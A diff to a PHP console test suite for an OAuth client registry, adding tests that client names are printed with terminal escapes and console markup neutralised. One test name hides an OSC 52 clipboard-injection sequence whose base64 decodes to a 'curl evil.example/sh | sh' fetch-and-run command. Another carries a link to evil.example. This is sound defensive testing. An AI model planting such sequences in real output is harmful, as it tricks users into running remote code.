@@ -58,6 +58,38 @@ final class ClientsTest extends ConsoleTestCase
     }
 
     /**
+     * RFC 7591 §2
+     */
+    #[Test]
+    public function theControlsOfTheNameAClientRegisteredAreNotPrinted(): void
+    {
+        // Given
+        $this->register("\e]52;c;Y3VybCBldmlsLmV4YW1wbGUvc2ggfCBzaAo=\x07\e]0;owned\x07A client");
+
+        // When
+        $tester = self::console(ClientListCommand::NAME);
+
+        // Then
+        static::assertStringContainsString(']52;c;Y3VybCBldmlsLmV4YW1wbGUvc2ggfCBzaAo=]0;ownedA client', $tester->getDisplay(true));
+    }
+
+    /**
+     * RFC 7591 §2
+     */
+    #[Test]
+    public function theMarkupOfTheNameAClientRegisteredIsPrintedAsText(): void
+    {
+        // Given
+        $this->register('A client <href=https://evil.example/>docs</>');
+
+        // When
+        $tester = self::console(ClientListCommand::NAME);
+
+        // Then
+        static::assertStringContainsString('A client <href=https://evil.example/>docs</>', $tester->getDisplay(true));
+    }
+
+    /**
      * RFC 7592 §2.1
      */
     #[Test]
@@ -137,7 +169,7 @@ final class ClientsTest extends ConsoleTestCase
         static::assertNotNull(self::service('test.beffroi.clients', ClientRepositoryInterface::class)->findByClientId(self::tenant(), 'oidc-demo'));
     }
 
-    private function register(): string
+    private function register(string $name = 'A client that registered itself'): string
     {
         self::service('test.beffroi.initial_access_tokens', InitialAccessTokenRepositoryInterface::class)
             ->save(new InitialAccessToken(
@@ -158,7 +190,7 @@ final class ClientsTest extends ConsoleTestCase
                 'HTTP_AUTHORIZATION' => 'Bearer ' . self::TOKEN,
             ],
             content: json_encode([
-                'client_name' => 'A client that registered itself',
+                'client_name' => $name,
                 'redirect_uris' => [self::REDIRECT_URI],
                 'token_endpoint_auth_method' => 'client_secret_basic',
             ], JSON_THROW_ON_ERROR),
